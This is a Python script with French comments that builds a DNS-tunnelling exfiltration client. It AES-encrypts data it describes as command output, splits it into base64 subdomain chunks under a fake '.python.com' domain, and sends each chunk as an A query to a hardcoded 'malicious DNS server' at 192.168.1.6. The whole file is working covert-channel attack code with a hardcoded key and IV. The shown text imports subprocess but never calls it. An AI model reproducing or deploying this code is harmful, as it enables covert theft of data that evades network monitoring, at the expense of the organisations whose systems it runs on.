# dns_client.py
# Version 0.9b
# Auteur : Raphaël KATHALUWA-LIYANAGE

# import des librairies standards
from dns import resolver                    # resolveur DNS
import subprocess                           # execution de commandes systèmes
import base64                               # encodage base64
from Crypto.Cipher import AES               # Chiffrement AES
from Crypto.Util.Padding import pad, unpad  # Fonctions padding

# # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
# Adresse et port du serveur DNS malicieux
# 192.168.1.6:53
HOST = '192.168.1.6'
PORT = 53
# clé de 32 octets pour utiliser AES-256 CBC
KEY = b'W3c9vlwl1Cj0tM6FHkh3pZ%OTc+x8ET='
# vecteur initial de 16 octets
IV = b'efd6cb512023b721'

# chiffrement AES CBC
def encrypt_aes_cbc(key, iv, plaintext):
    # nouvelle instance AES CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # chiffrement du message
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    
    # retour du chiffré texte en base64
    return base64.b64encode(ciphertext).decode()

# déchiffrement AES CBC
def decrypt_aes_cbc(key, iv, ciphertext):
    # nouvelle instance AES CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    # déchiffrement du message + décodage en base64
    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
    
    # retour du texte en clair
    return unpad(decrypted_data, AES.block_size).decode()

# division des données retournées par subprocess
# en bloc de 12 octets, rassemblés dans un tableau
def chunk(data):
    
    # taille des chunks
    chunk_size = 12
    # tableau qui va stocker tous les domaines à résoudre
    chunks = []

    # Itération des données dans chunk_size
    for i in range(0, len(data), chunk_size):
        # Obtention du chunk actuel
        chunk = data[i:i+chunk_size]

        # à faire chiffrer en AES (CTR ou CBC)
        encoded_chunk = encrypt_aes_cbc(KEY, IV, chunk)

        # ajout du faux domaine ".python.com" à la suite du chunk
        encoded_chunk += ".python.com"

        # chaque chunk est stocké dans un tableau
        # pour créer une requête par index
        # nécessaire pour bypass la limite de 63 octets ("sous-domaine")
        # et 255 octets pour le datagramme (domain au complet)
        chunks.append(encoded_chunk)

    # on retourne le tableau de l'ensemble des domaines
    return chunks


def send_dns(data):
    # on parcours l'ensemble du tableau
    for requests in data:

        # chaque index est une requête DNS de type A
        answer = res.resolve(requests.strip(), 'A')
        
        # affichage de l'adresse IP en réponse
        # (preuve du bon fonctionnement)
        for ipval in answer:
            print('IP', ipval.to_text())

# Créer une instance de resolver
res = resolver.Resolver()

# Spécifier le serveur DNS
res.nameservers = [HOST]
res.port = PORT

